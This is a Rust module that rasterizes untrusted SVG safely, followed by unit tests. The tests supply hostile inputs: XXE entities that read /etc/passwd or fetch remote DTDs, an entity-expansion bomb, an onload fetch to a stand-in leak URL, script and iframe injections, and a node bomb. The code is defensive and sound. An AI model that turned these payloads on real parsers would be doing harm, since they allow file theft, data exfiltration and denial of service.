//! Passive SVG rasterization. Publisher markup and external resources never reach the browser.

use std::{
    borrow::Cow,
    sync::{Arc, OnceLock},
};

use anyhow::{Context, Result, ensure};
use image::ImageEncoder as _;
use quick_xml::{Reader, events::Event};
use resvg::{tiny_skia, usvg};

const MAX_INPUT_BYTES: usize = 2 * 1024 * 1024;
const MAX_NODES: u32 = 20_000;
const MAX_RASTER_AXIS: u32 = 1600;
const FONT_NAME: &str = "Atkinson Hyperlegible";

fn fonts() -> Arc<usvg::fontdb::Database> {
    static FONTS: OnceLock<Arc<usvg::fontdb::Database>> = OnceLock::new();
    FONTS
        .get_or_init(|| {
            let mut database = usvg::fontdb::Database::new();
            database
                .load_font_data(include_bytes!("fonts/AtkinsonHyperlegible-Regular.ttf").to_vec());
            database.set_serif_family(FONT_NAME);
            database.set_sans_serif_family(FONT_NAME);
            database.set_monospace_family(FONT_NAME);
            database.set_cursive_family(FONT_NAME);
            database.set_fantasy_family(FONT_NAME);
            Arc::new(database)
        })
        .clone()
}

fn without_publisher_doctype(source: &str) -> Result<Cow<'_, str>> {
    if !source.contains("<!DOCTYPE") {
        return Ok(Cow::Borrowed(source));
    }
    let without_bom = source.strip_prefix('\u{feff}').unwrap_or(source);
    let offset = source.len() - without_bom.len();
    let mut reader = Reader::from_str(without_bom);
    loop {
        let start = offset + reader.buffer_position() as usize;
        match reader.read_event().context("reading SVG prolog")? {
            Event::DocType(declaration) => {
                let declaration = std::str::from_utf8(&declaration)?;
                ensure!(
                    declaration.split_ascii_whitespace().next() == Some("svg"),
                    "not an SVG doctype"
                );
                // Plotting tools emit external SVG declarations. Ignore those declarations,
                // but never pass internal subsets or entity definitions to the SVG parser.
                ensure!(
                    !declaration.contains('['),
                    "SVG doctype internal subsets are not allowed"
                );
                let end = offset + reader.buffer_position() as usize;
                return Ok(Cow::Owned(format!(
                    "{}{}",
                    &source[..start],
                    &source[end..]
                )));
            }
            Event::Start(_) | Event::Empty(_) | Event::Eof => return Ok(Cow::Borrowed(source)),
            _ => {}
        }
    }
}

pub(super) fn rasterize(bytes: &[u8], limits: &super::MediaLimits) -> Result<Vec<u8>> {
    ensure!(
        bytes.len() <= MAX_INPUT_BYTES.min(limits.max_file_bytes),
        "SVG input exceeds limit"
    );
    let source = std::str::from_utf8(bytes).context("SVG is not UTF-8")?;
    let source = without_publisher_doctype(source)?;
    let document = usvg::roxmltree::Document::parse_with_options(
        &source,
        usvg::roxmltree::ParsingOptions {
            allow_dtd: false,
            nodes_limit: MAX_NODES,
            ..Default::default()
        },
    )
    .context("parsing SVG")?;
    ensure!(
        document
            .root_element()
            .has_tag_name(("http://www.w3.org/2000/svg", "svg")),
        "not an SVG image"
    );
    let options = usvg::Options {
        font_family: FONT_NAME.into(),
        fontdb: fonts(),
        image_href_resolver: usvg::ImageHrefResolver {
            resolve_data: Box::new(|_, _, _| None),
            resolve_string: Box::new(|_, _| None),
        },
        ..Default::default()
    };
    let tree = usvg::Tree::from_xmltree(&document, &options).context("preparing SVG")?;
    let size = tree.size();
    let width = size.width();
    let height = size.height();
    ensure!(
        width.is_finite() && height.is_finite() && width > 0.0 && height > 0.0,
        "invalid SVG dimensions"
    );
    super::validate_stored_dimensions(width.ceil() as u32, height.ceil() as u32, limits)?;
    let bound = MAX_RASTER_AXIS.min(limits.max_axis) as f32;
    let scale = (bound / width.max(height)).min(1.0);
    let raster_width = (width * scale).ceil().max(1.0) as u32;
    let raster_height = (height * scale).ceil().max(1.0) as u32;
    super::validate_stored_dimensions(raster_width, raster_height, limits)?;
    let mut pixmap =
        tiny_skia::Pixmap::new(raster_width, raster_height).context("allocating SVG raster")?;
    resvg::render(
        &tree,
        tiny_skia::Transform::from_scale(scale, scale),
        &mut pixmap.as_mut(),
    );
    let mut rgba = Vec::with_capacity(pixmap.data().len());
    for pixel in pixmap.pixels() {
        let pixel = pixel.demultiply();
        rgba.extend_from_slice(&[pixel.red(), pixel.green(), pixel.blue(), pixel.alpha()]);
    }
    let mut png = Vec::new();
    image::codecs::png::PngEncoder::new(&mut png).write_image(
        &rgba,
        raster_width,
        raster_height,
        image::ExtendedColorType::Rgba8,
    )?;
    ensure!(
        png.len() <= limits.max_file_bytes,
        "SVG raster exceeds file limit"
    );
    Ok(png)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn render(svg: &str) -> image::RgbaImage {
        image::load_from_memory(
            &rasterize(svg.as_bytes(), &super::super::MediaLimits::default()).unwrap(),
        )
        .unwrap()
        .to_rgba8()
    }

    #[test]
    fn shapes_and_transparency_are_preserved_with_bounded_geometry() {
        let image = render(
            r#"<svg xmlns="http://www.w3.org/2000/svg" width="3200" height="1600"><rect width="3200" height="1600" fill="red" opacity="0.5"/></svg>"#,
        );
        assert_eq!(image.dimensions(), (1600, 800));
        assert_eq!(image.get_pixel(100, 100).0, [255, 0, 0, 128]);
    }

    #[test]
    fn publisher_doctypes_preserve_shapes_without_loading_external_definitions() {
        let svg = r#"<svg xmlns="http://www.w3.org/2000/svg" width="40" height="30"><rect width="40" height="30" fill="red"/></svg>"#;
        let expected = render(svg);
        for declaration in [
            "<!DOCTYPE svg>",
            "<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\"\n  \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\">",
            "<!DOCTYPE svg SYSTEM 'file:///nonexistent/aggr-svg.dtd'>",
        ] {
            let source = format!(
                "\u{feff}<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"no\"?>\n<!-- publisher export -->\n{declaration}\n{svg}"
            );
            assert_eq!(render(&source), expected);
        }
    }

    #[test]
    fn doctypes_cannot_define_or_expand_entities() {
        let limits = super::super::MediaLimits::default();
        for declaration in [
            "<!DOCTYPE svg [<!ENTITY unused 'harmless'>]>",
            "<!DOCTYPE svg [<!ENTITY payload SYSTEM 'file:///etc/passwd'>]>",
            "<!DOCTYPE svg [<!ENTITY payload SYSTEM 'https://example.com/secret'>]>",
            "<!DOCTYPE svg [<!ENTITY % remote SYSTEM 'https://example.com/entities.dtd'>%remote;]>",
            "<!DOCTYPE svg [<!ENTITY a '1234567890'><!ENTITY b '&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;'>]>",
            "<!DOCTYPE svg PUBLIC '-//W3C//DTD SVG 1.1//EN' 'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'><!DOCTYPE svg [<!ENTITY payload 'hidden'>]>",
        ] {
            let svg = format!(
                "{declaration}<svg xmlns='http://www.w3.org/2000/svg' width='40' height='30'><text>Diagram</text></svg>"
            );
            assert!(rasterize(svg.as_bytes(), &limits).is_err(), "{declaration}");
        }
        let undefined = "<!DOCTYPE svg SYSTEM 'https://example.com/entities.dtd'><svg xmlns='http://www.w3.org/2000/svg' width='40' height='30'><text>&payload;</text></svg>";
        assert!(rasterize(undefined.as_bytes(), &limits).is_err());
    }

    #[test]
    fn doctype_text_inside_comments_and_content_is_preserved() {
        let svg = "<!-- <!DOCTYPE svg SYSTEM 'unused'> --><svg xmlns='http://www.w3.org/2000/svg' width='200' height='40'><text x='5' y='25'><![CDATA[<!DOCTYPE svg>]]></text></svg>";
        assert_eq!(without_publisher_doctype(svg).unwrap(), svg);
        assert!(render(svg).pixels().any(|pixel| pixel[3] > 0));
    }

    #[test]
    fn text_uses_the_embedded_font_without_system_fonts() {
        let image = render(
            r#"<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60"><text x="5" y="40" font-family="sans-serif" font-size="30">Diagram</text></svg>"#,
        );
        assert!(image.pixels().filter(|pixel| pixel[3] > 0).count() > 200);
    }

    #[test]
    fn scripts_and_external_or_embedded_images_have_no_effect() {
        let directory = tempfile::tempdir().unwrap();
        let local = directory.path().join("secret.png");
        image::RgbaImage::from_pixel(10, 10, image::Rgba([255, 0, 0, 255]))
            .save(&local)
            .unwrap();
        let clean = r#"<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40"><rect width="10" height="10" fill="blue"/></svg>"#;
        let malicious = format!(
            r#"<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" onload="fetch('https://example.com/leak')"><script>bad()</script><image href="{}" width="40" height="40"/><image href="https://example.com/tracker.png" width="40" height="40"/><image href="data:image/svg+xml,%3Csvg%20onload='bad()'/%3E" width="40" height="40"/><foreignObject width="40" height="40"><iframe src="https://example.com/"/></foreignObject><rect width="10" height="10" fill="blue"/></svg>"#,
            local.display()
        );
        assert_eq!(render(&malicious), render(clean));
        assert_eq!(
            render(&format!(
                "<!DOCTYPE svg SYSTEM 'file:///unused.dtd'>{malicious}"
            )),
            render(clean)
        );
    }

    #[test]
    fn entities_node_bombs_and_extreme_dimensions_are_rejected() {
        let limits = super::super::MediaLimits::default();
        for svg in [
            "<!DOCTYPE svg [<!ENTITY x SYSTEM 'file:///etc/passwd'>]><svg xmlns='http://www.w3.org/2000/svg'>&x;</svg>".to_owned(),
            "<svg xmlns='http://www.w3.org/2000/svg' width='1000000000' height='1000000000'/>".to_owned(),
            format!("<svg xmlns='http://www.w3.org/2000/svg'>{}</svg>", "<g/>".repeat(MAX_NODES as usize)),
        ] {
            assert!(rasterize(svg.as_bytes(), &limits).is_err());
        }
    }
}
